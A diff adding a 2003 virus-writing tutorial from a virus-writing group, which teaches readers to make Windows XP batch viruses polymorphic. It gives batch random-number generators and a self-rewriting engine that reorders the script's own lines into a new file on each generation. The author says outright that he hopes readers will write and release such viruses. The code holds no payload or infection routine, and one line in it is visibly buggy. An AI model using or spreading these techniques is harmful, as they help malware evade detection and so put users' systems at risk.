@@ -1,0 +1,301 @@
+
+			*************************************************************
+			*************************************************************
+			************			       		  ***********
+			************         Polymorphism in BatXP        ***********
+			************     by Second Part To Hell/[rRlf]	  ***********
+			************					  ***********
+			*************************************************************
+			*************************************************************
+
+After writing 2 different polymorph BatXP viriis I thought, that I should write a tutorial about this,
+because I've never seen an other poly BatXP virus (ok, i just saw two other BatXP viruses) ;)
+
+In this tutorial I'll explain how to write such a virus.
+I hope, that I'll see some of this viruses in the near future out there.
+
+OK, now let me explain how to make such things:
+Every poly virus need random numbers. I think, it's the biggest problem to find random numbers.
+If you have random-numbers, it's easy to make the virus polymorph.
+
+Now I'll show u two ways of getting random number in BatXP:
+
+
+
+Random Numbers via time
+~~~~~~~~~~~~~~~~~~~~~~~
+
+The idea of such an random number generator was tooken from a code of philet0ast3r/[rRlf]!
+Very thank ya!!!
+
+------------------------------------------------------------------------------------
+set aa=0
+set tm=0
+:start
+if %aa% EQU 5 goto writeply
+set /a aa=%aa%+1
+:polyst
+if %tm% EQU 9 set tm=0
+set /a tm=%tm%+1
+ver|time|find ",%tm%">nul
+if not errorlevel 1 (
+set number%aa%=%tm%
+goto start
+)
+goto polyst
+:writeply
+echo %number1% %number2% %number3% %number4% %number5%
+pause
+------------------------------------------------------------------------------------
+
+I'm going to explain every line:
+
+/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\
+
+set aa=0
+	"aa" is the second part of our random-variable.
+	U may wonder why i set aa=0 at the begin.
+	But it's easy: CMD will calculate with it, and if I didn't write this,
+	the variable would be nothing. If CMD calculates with nothing, there will be a
+	error and the program stops. I don't want that, do you? ;)
+
+set tm=0
+	"tm" is our time variable.
+	It's used to find a random-number.
+	I set tm=0 because of the same reason as "aa".
+
+:start
+	Our start-lable. Now the program begins to search for random numbers.
+
+if %aa% EQU 5 goto writeply
+	The program searchs for 5 random-numbers. And I told u, that "aa" is the second part
+	of the random-variable. EQU is the same as "=". So if "aa" is 5, the program
+	should show us the random-numbers. Because of that we jump to the "writeply"-lable.
+
+set /a aa=%aa%+1
+	The parameter "/a" says, that the command shall calculate. What's to calculate?
+	"aa"+1. That's all. At first time "aa" is zero. now we add one to zero (first time): 0+1=1
+	now "aa" is 1, than 2, 3, 4, 5! Now take a look at the last line and you'll know, what's than!
+
+:polyst
+	Another lable. The program will jump to this lable, if it find's no poly number.
+	Than the searching starts again.
+
+if %tm% EQU 9 set tm=0
+	I told you, that "tm" is the time varible. And because we just want numbers from 1 to 9,
+	we set tm=0 if it's 9!
+
+set /a tm=%tm%+1
+	Once more the parameter "/a" which sais, that we wanna calculate. 
+	This line is the same as: "new-tm"="old-tm"+1!
+	If we don't do this, our time-var is everytime zero, and also the random numbers are zero.
+
+ver|time|find ",%tm%">nul
+	It's the main-part of the whole random-number generator.
+	This line compare the dezisecond of the moment with "tm".
+	If there's any error, the error won't printed to the screen because of ">nul"!
+
+if not errorlevel 1 (
+	if the dezisecond is the same as "tm", the next two command will start.
+
+set number%aa%=%tm%
+	the variable number"aa" (one of the 5 random numbers) is "tm"!
+
+goto start
+	Here we jump to the start for searching more random-numbers!
+
+)
+	It's like "end if"!
+
+goto polyst
+	The program wasn't able to find a number, so it search again for one.
+
+:writeply
+	It's the last lable! The program will jump to it, if there are 5 random numbers found.
+
+echo %number1% %number2% %number3% %number4% %number5%
+	Here the program prints the 5 random number to the screen.
+
+pause
+	It's just 4 u! CMD would close, if it has finished everything.
+	And because we wanna have a look at the numbers, we don't want that.
+
+
+/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\
+
+This number generator has only 297 Bytes. And it's no problem to make more random-numbers.
+And it's also possible to use this # generator in normal batch ( you have to rewrite most of the program,
+but the main things are the same). The only bad is, that's hard to understand. ;)
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+#########################################################################################################
+
+
+
+Random Numbers via %random%
+~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+The new BatXP use a command named "%random%". %random% is a random nmber between 1 and 32767!
+This number is to big for our random-engine! so what to do? We must make it smaller! ;)
+
+The following code was tooked from BatXP.Saturn by me!
+
+------------------------------------------------------------------------------------
+set aa=0
+:start
+if %aa% EQU 5 goto writeply
+set /a aa=%aa%+1
+set a=%random%
+:polyst
+if %a% GEQ 50 (set /A a=%a%/2)
+if %a% LEQ 40 (set /A a=%a%+10)
+if %a% GEQ 50 (goto polyst)
+if %a% LSS 40 (goto polyst)
+set /A number%aa%=%a%-40
+goto start
+:writeply
+echo %number1% %number2% %number3% %number4% %number5%
+pause
+------------------------------------------------------------------------------------
+
+Now I'll explain every line again!
+
+/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\
+
+set aa=0
+	We use it for the same reason as in the other poly-generator.
+	It's the second part of our random numbers.
+	And we need this variable 4 calculate.
+
+:start
+	This is the start-lable. The program need it for searching random numbers.
+
+if %aa% EQU 5 goto writeply
+	The program checks, if "aa"=5! If yes, than 5 numbers still exist, and it jump to the
+	lable "writeply"
+
+set /a aa=%aa%+1
+	It's nothing else as "set /calculate "new-aa"="old-aa"+1
+	The program checks with this way, how much numbers still exists!
+
+set a=%random%
+	This is the most important line in the progam.
+	Now the variable "a" is a number between 1 and 32767!
+
+:polyst
+	It's the next lable. The program jumps to it, if the number is higher than 50 or lower than 40.
+	U will understand it after reading the whole thing.
+
+if %a% GEQ 50 (set /A a=%a%/2)
+	It's the same as "if %a% >= 50 ..." OK, we said, the random number is to big, so we want to make it smaller.
+	First the program checks, if it's to big. If yes, it div the variable with 2! So you can make the variable smaller.
+
+if %a% LEQ 40 (set /A a=%a%+10)
+	It's "if %a% =< 40..." Last line we made the variable smaller. It could be, that the our number is too small.
+	So, if the varible is too small, we add 10 to it!
+
+if %a% GEQ 50 (goto polyst)
+	We want our random number to be between 40 and 50! If "a" isn't so, we go to polyst and to the same again.
+
+if %a% LSS 40 (goto polyst)
+	LSS is the same as "<". Now we'll check, if "a" is smaller than 40. If yes, we go to polyst.
+
+set /A number%aa%=%a%-40
+	Our "a" is between 40 and 50 now. OK, that's good. We make a new varible named "number%aa%".
+	You have to know, that the "aa" is a number. For instanze:
+	1. random number: aa=1
+	2. random number: aa=2
+	...
+	I hope, u understand it.
+	You may ask why "-40"! OK, the "a" is a number between 40 and 50. But the end-variable shall be a number between
+	0 and 10. We have only to sub 40! ;)
+
+goto start
+	Jump to the lable which searchs for another random number.
+
+:writeply
+	If the program finds 5 random numbers, it will write them to the screen. Because of that it jumps to
+	this lable.
+
+echo %number1% %number2% %number3% %number4% %number5%
+	Output the 5 random numbers to the screen.
+
+pause
+	BatXP closes the DOS-Windows, if nothing more is to do. With this command it waits until the user
+	press any key.
+
+/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\
+
+This file has 323 Bytes. It's very easy to add more numbers. But it's not possible to use it with normal Batch.
+And I think, this rnd-sample is easy to understand.
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+#########################################################################################################
+
+
+BatXP poly example
+~~~~~~~~~~~~~~~~~~
+
+Now we know how to make random numbers. But I think, we don't know how to make a polymorph BatXP virus with this
+numbers.
+I wanna explain one way to change the code of the virus every generation. There could be more ways, but I was to
+lazy to search others.
+
+This one way mixes the code every generation: What's to do while using this techique?
+You have to add every line of the poly-engine the string "% aaaa %".
+
+
+------------------------------------------------------------------------------------
+
+< The changed poly-engine >
+find "aaaa"<%0>>new.cmd
+%aaaa%set ra=0
+%aaaa%set rb=0
+%aaaa%set /a ra=%number1%+%number2%
+%aaaa%set /a rb=%number3%+number4%
+%aaaa%If %ra% GEQ %rb% goto ra
+%aaaa%goto rb
+
+:ra	%bbbb%
+%bbbb%set b=b
+%bbbb%set c=c
+%bbbb%find "%b%bbb"<%0>>new.cmd
+%bbbb%find "%c%ccc"<%0>>new.cmd
+%bbbb%goto finish
+
+:rb	%cccc%
+%cccc%set b=b
+%cccc%set c=c
+%cccc%find "%c%ccc"<%0>>new.cmd
+%cccc%find "%b%bbb"<%0>>new.cmd
+%cccc%goto finish
+
+:finish	%dddd%
+find "dddd"<%0>>new.cmd
+------------------------------------------------------------------------------------
+
+It's only a quite easy exaple and I think, you'll understand it.
+What does this code? Writing a new file named "new.cmd".
+First it writes the lines with "aaaa" to the file. Then the random-part! If the rnd-number 1 and 2
+are bigger than rnd-number 2 and 3 then it writes the "bbbb"-lines and then the "cccc"-one to the file.
+Else first the "cccc" and then the "bbbb". In the end of the code it writes the "dddd"-code to the file.
+The "dddd"'s are the finish part. Just the finish lable. I tested the program with WinXP and it worked. ;)
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+#########################################################################################################
+
+Last words
+~~~~~~~~~~
+
+It should be no problem to use this technique. It's also possible to write a virus with more than 10.000.000.000
+different ways (no, the virus won't have 1 MB). I will be happy, if you write a virus with help of this tutorial.
+If you have questions, suggestions or something else, pls write me a mail.
+
+
+							- - - - - - - - - - - - - - -
+							  Second Part To Hell/[rRlf]  
+							  www.spth.de.vu
+							  spth@aonmail.at
+							  written in jan. 2003
+							  Austria
+							- - - - - - - - - - - - - - - 
